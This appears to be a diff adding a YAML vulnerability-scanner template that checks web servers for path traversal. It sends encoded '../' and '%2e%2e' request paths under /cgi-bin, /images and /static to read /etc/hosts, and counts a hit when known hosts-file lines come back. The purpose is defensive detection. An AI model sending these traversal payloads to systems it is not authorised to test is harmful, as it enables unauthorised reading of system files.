@@ -1,0 +1,36 @@
+id: path-traversal-exposed
+
+info:
+  name: HTTP path traversal exposed
+  description: This template can be used to detect Path Traversal exposed files containing sensitive information.
+  author: reewardius
+  severity: high
+  tags: lfi,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
+      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
+      - "{{BaseURL}}//////////.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
+      - "{{BaseURL}}/images///////etc/hosts"
+      - "{{BaseURL}}/images../../../../..//etc/hosts"
+      - "{{BaseURL}}/images/../../../../../etc/hosts"
+      - "{{BaseURL}}/static///////etc/hosts"
+      - "{{BaseURL}}//etc/hosts"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "# Do not remove the following line, or various programs"
+          - "# that require network functionality will fail."
+          - "127.0.0.1       localhost"
+        part: body
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          - 304
+        condition: or		  
